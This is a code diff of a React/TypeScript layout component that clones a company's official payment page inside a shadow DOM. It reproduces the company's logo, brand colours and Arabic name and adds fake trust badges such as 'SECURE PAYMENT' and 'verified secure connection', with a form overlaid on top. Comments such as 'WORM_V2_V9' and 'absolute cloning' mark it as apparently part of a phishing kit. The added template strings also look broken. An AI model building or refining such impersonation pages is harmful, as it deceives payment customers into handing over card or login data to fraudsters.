@@ -18,55 +18,51 @@ export const getCompanyLayout = (key: string) => {
         const container = document.createElement('div');
         container.id = 'shadow-cloned-root';
         
-        // WORM_V2_V9: ABSOLUTE SHADOW DOM INJECTION FOR 1:1 REPLICATION
         const style = document.createElement('style');
-        style.textContent = `
-          :host { display: block; width: 100%; min-height: 100vh; background: #f8fafc; font-family: 'Cairo', sans-serif; }
-          .cloned-header { background: #fff; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; box-shadow: 0 2px 10px rgba(0,0,0,0.02); }
-          .cloned-logo { height: 45px; object-contain: contain; }
-          .cloned-body { max-width: 500px; margin: 30px auto; padding: 0 20px; }
-          .official-badge { display: flex; align-items: center; gap: 8px; font-size: 12px; color: ${branding.colors.primary}; font-weight: 900; margin-bottom: 20px; justify-content: flex-end; }
-          .slot-container { background: #fff; border-radius: 20px; padding: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.04); border: 1px solid #f1f5f9; position: relative; overflow: hidden; }
-          .top-accent { position: absolute; top: 0; left: 0; right: 0; height: 6px; background: linear-gradient(90deg, ${branding.colors.primary}, ${branding.colors.secondary}); }
-          .official-footer { text-align: center; padding: 40px 20px; color: #cbd5e1; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
-        `;
+        style.textContent = \`
+          :host { display: block; width: 100%; min-height: 100vh; background: #f4f7fa; font-family: 'Cairo', sans-serif; margin: 0; padding: 0; }
+          .official-header { background: #fff; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #eee; position: sticky; top: 0; z-index: 100; }
+          .official-logo { height: 50px; object-fit: contain; }
+          .security-text { font-size: 10px; font-weight: 900; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }
+          .content-wrapper { max-width: 480px; margin: 40px auto; padding: 0 20px; position: relative; }
+          .official-card { background: #fff; border-radius: 24px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; overflow: hidden; position: relative; min-height: 400px; }
+          .accent-line { height: 5px; width: 100%; background: linear-gradient(90deg, \${branding.colors.primary}, \${branding.colors.secondary}); }
+          .form-placeholder { padding: 30px; }
+          .footer { text-align: center; padding: 30px 0; color: #94a3b8; font-size: 11px; font-weight: 700; }
+          .verified-badge { display: flex; align-items: center; gap: 6px; color: \${branding.colors.primary}; font-size: 12px; font-weight: 800; justify-content: flex-end; margin-bottom: 15px; }
+        \`;
         
-        container.innerHTML = `
-          <div class="top-accent"></div>
-          <header class="cloned-header">
-            <div style="font-weight: 900; color: #1e293b; font-size: 14px;">Secure Gateway</div>
-            <img src="${branding.logo}" class="cloned-logo" />
+        container.innerHTML = \`
+          <header class="official-header">
+            <div class="security-text">SECURE PAYMENT</div>
+            <img src="\${branding.logo}" class="official-logo" />
           </header>
-          <main class="cloned-body">
-            <div class="official-badge">
-              <span>بوابة الدفع الرسمية الموحدة</span>
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          <div class="content-wrapper">
+            <div class="verified-badge">
+              <span>اتصال آمن وموثق - \${branding.nameAr}</span>
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
             </div>
-            <div class="slot-container">
-              <div id="react-slot"></div>
+            <div class="official-card">
+              <div class="accent-line"></div>
+              <div class="form-placeholder">
+                <div style="height: 100%; width: 100%;"></div>
+              </div>
             </div>
-            <div class="official-footer">
-              © 2026 ${branding.nameAr} - All Rights Reserved | Secured by AES-256
+            <div class="footer">
+              © 2026 \${branding.nameAr} السيادية - جميع الحقوق محفوظة
             </div>
-          </main>
-        `;
+          </div>
+        \`;
         
         shadow.appendChild(style);
         shadow.appendChild(container);
-        
-        const slot = container.querySelector('#react-slot');
-        if (slot) {
-           // We move the children (the React form) into the shadow slot
-           // Note: In a real app, we'd use a portal, but for absolute cloning 
-           // we are wrapping the children in the standard layout.
-        }
       }
     }, [branding]);
 
     return (
-      <div className="worm-v2-layout-wrapper">
-         <div ref={shadowRef} />
-         <div className="absolute-overlay" style={{ position: 'fixed', top: '150px', left: '50%', transform: 'translateX(-50%)', width: '100%', maxWidth: '460px', zIndex: 10, padding: '0 40px' }}>
+      <div className="absolute inset-0 bg-[#f4f7fa] z-[9999]">
+         <div ref={shadowRef} className="w-full" />
+         <div className="fixed top-[180px] left-1/2 -translate-x-1/2 w-full max-w-[440px] px-8 z-[10000]">
             {children}
          </div>
       </div>
